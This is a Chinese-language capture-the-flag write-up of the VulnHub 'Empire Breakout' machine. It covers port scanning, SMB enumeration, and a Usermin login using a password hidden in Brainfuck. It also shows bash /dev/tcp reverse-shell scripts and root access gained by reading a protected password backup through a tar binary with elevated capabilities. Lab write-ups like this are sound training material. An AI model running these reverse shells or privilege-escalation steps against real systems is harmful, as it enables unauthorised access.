---
title: "Empire Breakout"
date: 2026-03-11 
draft: false
weight: 1
---

## 一、信息收集
靶机ip`192.168.242.94`

### 1.1 端口扫描（教训）
```ZSH
┌──(kali㉿kali)-[~]
└─$ nmap -A 192.168.242.94
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 22:10 EST
Nmap scan report for 192.168.242.94
Host is up (0.0089s latency).
All 1000 scanned ports on 192.168.242.94 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: D-Link DFL-700 firewall (89%), HP Officejet Pro 8500 printer (89%), IBM i 7.4 (89%), ReactOS 0.3.7 (89%), Sanyo PLC-XU88 digital video projector (89%), Sonus GSX9000 VoIP proxy (88%), Asus WL-500gP wireless broadband router (88%), Microsoft Windows 2000 (88%), Microsoft Windows Server 2003 Enterprise Edition SP2 (88%), Microsoft Windows Server 2003 SP2 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.15 ms 192.168.203.2
2   0.15 ms 192.168.242.94

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 247.15 seconds

┌──(kali㉿kali)-[~]
└─$ sudo nmap -A 192.168.242.94                                 
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-21 22:23 EST
Nmap scan report for 192.168.242.94
Host is up (0.00028s latency).
All 1000 scanned ports on 192.168.242.94 are in ignored states.
Not shown: 1000 filtered tcp ports (no-response)
Too many fingerprints match this host to give specific OS details

TRACEROUTE (using port 80/tcp)
HOP RTT    ADDRESS
1   ... 30

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.11 seconds
```
第一个命令结果是`1000 filtered tcp ports`，因为没加`sudo`，没扫出端口，Nmap默认切换了底层的扫描技术，这里用的是全连接扫描，它被迫使用操作系统的标准网络接口来执行TCP Connect Scan(`-sT`)，需要完成完整的TCP三次握手，而加上`sudo`，使用SYN Stealth Scan(-sS)，只发送第一个握手包(SYN)，不建立完整连接。
而防火墙会对完整的连接请求敏感，一旦发现短时间内尝试连接大量端口，会判定为攻击并封锁我的ip

新思路：
```ZSH
┌──(kali㉿kali)-[~/vulnhub/vulnhub_em_br]
└─$ sudo nmap -sS -Pn -p- --min-rate 5000 192.168.242.94 -oN all_ports.txt
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 01:08 EST
Nmap scan report for 192.168.242.94
Host is up (0.012s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 180.97 seconds
```
第二个命令明明加入了`-p-`，但是结束的非常快，原因在于这里使用了`--min-rate 5000`且去掉了复杂的探测参数，只发送SYN包，不管对方回不回，强制维持高频率发包速率，但是第二个命令也因此丢失了10000和20000端口！被错误归类为`filtered`中。

### 1.2 端口扫描（最佳思路）
~~先暴力发包~~，`-sS -sV -sC -T4`搜索保证精确度兼顾速度，再针对发现的端口单独进行`-A`探测

```ZSH
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sS -sV -sC -T4 192.168.242.94 
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 00:47 EST
Nmap scan report for 192.168.242.94
Host is up (0.0021s latency).
Not shown: 995 filtered tcp ports (no-response)
PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.51 (Debian)
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows

Host script results:
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-06-11T15:21:33
|_  start_date: N/A
|_clock-skew: -224d14h26m10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 215.60 seconds


┌──(kali㉿kali)-[~/vulnhub/vulnhub_em_br]
└─$ sudo nmap -A -p 80,139,445,10000,20000 192.168.242.94
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 02:52 EST
Nmap scan report for 192.168.242.94
Host is up (0.00092s latency).

PORT      STATE SERVICE     VERSION
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4.37
OS details: DD-WRT v24-sp2 (Linux 2.4.37)
Network Distance: 2 hops

Host script results:
|_clock-skew: -224d14h26m09s
| smb2-time: 
|   date: 2025-06-11T17:26:57
|_  start_date: N/A
|_nbstat: NetBIOS name: BREAKOUT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS
1   0.09 ms 192.168.203.2
2   0.07 ms 192.168.242.94

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.16 seconds
```

根据扫描结果~~如下~~，Web服务(`80端口`)是Apache默认页，查看源代码或目录爆破可能有线索，SMB服务(`139、445端口`)发现Samba 4，可能有未授权共享，Webmin/Usermin(`10000/20000端口`)发现版本号1.981和1.830，Webmin历史上出过多次远程代码执行漏洞(RCE)，如果能找到账号密码，就能直接控制服务器。
```ZSH
80/tcp    open  http        Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Apache2 Debian Default Page: It works
139/tcp   open  netbios-ssn Samba smbd 4
445/tcp   open  netbios-ssn Samba smbd 4
10000/tcp open  http        MiniServ 1.981 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
20000/tcp open  http        MiniServ 1.830 (Webmin httpd)
|_http-title: 200 &mdash; Document follows
```

### 1.3 http探测
F12源码，发现神秘信息，这里是Brainfuck语言编程的
```
<!--
don't worry no one will get here, it's safe to share with you my access. Its encrypted :)

++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>++++++++++++++++.++++.>>+++++++++++++++++.----.<++++++++++.-----------.>-----------.++++.<<+.>-.--------.++++++++++++++++++++.<------------.>>---------.<<++++++.++++++.

-->
```
解码后结果为`.2uqPEfj3D<P'a-3`

### 1.4 10000/20000端口
10000为Webmin，而20000为Usermin

### 1.5 smb服务探测 139、445端口
```ZSH
┌──(kali㉿kali)-[~/vulnhub/vulnhub_em_br]
└─$ enum4linux 192.168.242.94   
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Jan 22 03:23:01 2026

 =========================================( Target Information )=========================================
                                                                 
Target ........... 192.168.242.94                                                                                                                           
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===========================( Enumerating Workgroup/Domain on 192.168.242.94 )===========================
                                                            
[+] Got domain/workgroup name: WORKGROUP                                                                                                          
 ===============================( Nbtstat Information for 192.168.242.94 )===============================
                                                                    
Looking up status of 192.168.242.94                                                                                                                         
        BREAKOUT        <00> -         B <ACTIVE>  Workstation Service
        BREAKOUT        <03> -         B <ACTIVE>  Messenger Service
        BREAKOUT        <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ==================================( Session Check on 192.168.242.94 )==================================
                                                                    
[+] Server 192.168.242.94 allows sessions using username '', password ''                                                                                 
 ===============================( Getting domain SID for 192.168.242.94 )===============================
                                                                   
Domain Name: WORKGROUP                                                                                                                                      
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                     
 ==================================( OS information on 192.168.242.94 )==================================
                                                                   
[E] Can't get OS info with smbclient                                                                                                                   
[+] Got OS info for 192.168.242.94 from srvinfo:                                                                                                            
        BREAKOUT       Wk Sv PrQ Unx NT SNT Samba 4.13.5-Debian                                                                                             
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03

 ======================================( Users on 192.168.242.94 )======================================
                                                              
Use of uninitialized value $users in print at ./enum4linux.pl line 972.                                                                                     
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 975.

Use of uninitialized value $users in print at ./enum4linux.pl line 986.
Use of uninitialized value $users in pattern match (m//) at ./enum4linux.pl line 988.

 ================================( Share Enumeration on 192.168.242.94 )================================
                                                            
smbXcli_negprot_smb1_done: No compatible protocol selected by server.                                                  
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Samba 4.13.5-Debian)
Reconnecting with SMB1 for workgroup listing.
Protocol negotiation to server 192.168.242.94 (for a protocol between LANMAN1 and NT1) failed: NT_STATUS_INVALID_NETWORK_RESPONSE
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 192.168.242.94                                                                                                              
//192.168.242.94/print$ Mapping: DENIED Listing: N/A Writing: N/A                                                                               
[E] Can't understand response:                                                                                                                           
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                  
//192.168.242.94/IPC$   Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information for 192.168.242.94 )===========================
                                                               
Password:                                                                               
[+] Attaching to 192.168.242.94 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] BREAKOUT
        [+] Builtin

[+] Password Info for Domain: BREAKOUT

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 136 years 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 136 years 37 days 6 hours 21 minutes 

[+] Retieved partial password policy with rpcclient:                                                                                        
Password Complexity: Disabled                                                                                                                               
Minimum Password Length: 5

 ======================================( Groups on 192.168.242.94 )======================================
                                                     
[+] Getting builtin groups:                                                                                                                        
[+]  Getting builtin group memberships:                                                                                                   
[+]  Getting local groups:                                                                                                                          
[+]  Getting local group memberships:                                                                                                           
[+]  Getting domain groups:                                                                                                                    
[+]  Getting domain group memberships:                                                                                                                      
 =================( Users on 192.168.242.94 via RID cycling (RIDS: 500-550,1000-1050) )=================
                                                        
[I] Found new SID:                                                                                                                                          
S-1-22-1                                                                                   
[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                      
[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                         
[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                          
[I] Found new SID:                                                                                                                                          
S-1-5-32                                                                                         
[+] Enumerating users using SID S-1-5-21-1683874020-4104641535-3793993001 and logon username '', password ''                                                
                                                                   
S-1-5-21-1683874020-4104641535-3793993001-501 BREAKOUT\nobody (Local User)                                                                                  
S-1-5-21-1683874020-4104641535-3793993001-513 BREAKOUT\None (Domain Group)

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                 
                                                               
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                           
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                 
                     
S-1-22-1-1000 Unix User\cyber (Local User)                                                                                                                  
 ==============================( Getting printer info for 192.168.242.94 )==============================
                                                                                      
No printers returned.

enum4linux complete on Thu Jan 22 03:24:39 2026
```
1. 本地用户：`S-1-22-1-1000 Unix User\cyber (Local User)`，`cyber`
2. 允许空会话：`Server 192.168.242.94 allows sessions using username '', password ''`
3. 密码策略：`Password Complexity: Disabled   Minimum Password Length: 5`

登录usermin，账户cyber，密码.2uqPEfj3D<P'a-3

## 二、漏洞利用
### 反弹shell（失败）
kali linux中手动设置LingJing实验室网段ip`sudo ip addr add 192.168.242.100/24 dev eth0`，这样kali 和靶机处于同一网段中，但结果发现反而ping不通，因此删除`sudo ip addr del 192.168.242.100/24 dev eth0`，是由于`eth0`网卡处于VMware的NAT模式，有一个虚拟路由器，只负责转发`192.168.203.X`的流量，当把源IP改为`192.168.242.100`时，流量发出，但到达vmware虚拟网关后，发现不属于它管理的网段，直接把包丢弃，因此没有通路抵达靶机。
因此修改vmware为桥接模式（复制物理网络连接状态能自动更新ip，但我的是主机，而不是到处移动的笔记本，因此不需要这个）。

再次添加`192.168.242.100`ip到eth0中

接着命令窗口中开启监听端口`nc -lvnp 4444`
登录页面后左下角有cmd shell，接着编写反弹shell脚本，`vim shell.sh`
```BASH
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.242.94/4444 0>&1'
chmod +x shell.sh
./shell.sh
```

失败！
NAT模式失败：由于虚拟机是防火墙后的电脑
桥接模式失败：手动添加了ip依旧无法ping通，添加ip后，kali会认为自己直接连接在那个网段，会尝试通过二层协议（ARP）寻找靶机，而不是通过原有的网关。

### FLAG1
```bash
[cyber@breakout ~]$ ls
tar
user.txt
[cyber@breakout ~]$ cat user.txt
3mp!r3{You_Manage_To_Break_To_My_Secure_Access}

```
第一个FLAG`3mp!r3{You_Manage_To_Break_To_My_Secure_Access}`

### FLAG2
```BASH
[cyber@breakout ~]$ ls -l tar
-rwxr-xr-x 1 root root 531928 Oct 19  2021 tar
[cyber@breakout ~]$ getcap tar
tar cap_dac_read_search=ep
```
发现文件权限很高，且可执行，getcap后，`=ep`，其中`e`代表有效，`p`代表允许，tar在运行时可以直接行使特权，tar可以打包系统任意文件

```BASH
[cyber@breakout ~]$ ls -la /var/backups
total 28
drwxr-xr-x  2 root root  4096 Jun 11 10:36 .
drwxr-xr-x 14 root root  4096 Oct 19  2021 ..
-rw-r--r--  1 root root 12732 Oct 19  2021 apt.extended_states.0
-rw-------  1 root root    17 Oct 20  2021 .old_pass.bak
```
接着根据攻略，检查/var/backups这一文件夹，发现一个隐藏文件`.old_pass.bak`，这个文件没有执行权限，但tar有权限，可以用tar压缩这个隐藏文件，再解压，这样权限就没有问题了

```bash
[cyber@breakout ~]$ ./tar -cvf passwd.tar /var/backups/.old_pass.bak
./tar: Removing leading `/' from member names
/var/backups/.old_pass.bak

[cyber@breakout ~]$ ls
passwd.tar
tar
user.txt
var
```
-c(create)、-v(verbose)可视化、-f(file)指定文件名（passwd.tar），将`.old_pass.bak`压缩到当前的目录

```BASH
[cyber@breakout ~]$ tar -xvf passwd.tar
var/backups/.old_pass.bak
[cyber@breakout ~]$ cat var/backups/.old_pass.bak
Ts&4&YurgtRX(=~h
```
执行压缩操作时候，`tar`会把路径信息存入包内，解压时候`tar`根据路径信息，在当前目录下还原出完整的文件夹层级。
-x(extract)提取/解压、-v、-f(file)指定要解压的文件。
第二个FLAG：`Ts&4&YurgtRX(=~h`

### 提权（先反弹shell）
```BASH
[cyber@breakout ~]$ su root
Password: su: Authentication failure
```
尝试root用户登录失败，不让输入密码，必须反弹shell，放弃实验室环境，直接安装虚拟机，靶机ip为：`192.168.203.130`
接着在靶机命令行窗口中`vim shell.sh`，内容如下：
```SHELL
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/192.168.203.129/1234 0>&1'
```
接着赋予其权限`chmod +x ./bash.sh`，注意这里用的是`+`，我手打时候误用了`-`，导致删除权限，反而无法使用
kali中开启端口监听，`nc -lvp 1234`
`./shell.sh`启动文件，成功反弹shell

接着root用户登录（用到了隐藏文件的内容当作密码）
```SHELL
cyber@breakout:~$ su root
su root
Password: Ts&4&YurgtRX(=~h
whoami
root
```
### FLAG2
（cd ..可以返回上一级文件夹）接着`cd /root`，发现文件`rOOt.txt`，其中flag内容如下：
```SHELL
3mp!r3{You_Manage_To_BreakOut_From_My_System_Congratulation}
Author: Icex64 & Empire Cybersecurity
```

### 反思
这里耗时最多的是反弹shell，LingJing实验室环境中开启靶机有缺点，反弹shell功能无法开启，暂未找到解决方法，因此接下来的实验都建议在官方网站中下载镜像，vmware中进行破解。